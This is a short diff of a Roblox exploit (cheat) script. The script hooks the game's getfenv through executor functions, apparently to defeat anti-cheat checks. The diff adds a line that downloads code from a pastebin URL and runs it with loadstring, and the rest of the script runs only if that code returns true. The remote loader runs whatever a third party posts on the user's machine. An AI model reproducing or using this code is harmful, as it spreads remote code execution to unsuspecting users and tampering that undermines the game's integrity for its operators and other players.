@@ -1,4 +1,6 @@
-    local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local free_access = loadstring(game:HttpGet("https://pastebin.com/raw/mq68M8Zw"))()
+if free_access == true then
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
     local OldGetFenv; OldGetFenv = hookfunction(getrenv().getfenv, function(...)
         if not checkcaller() then
             return coroutine.yield()
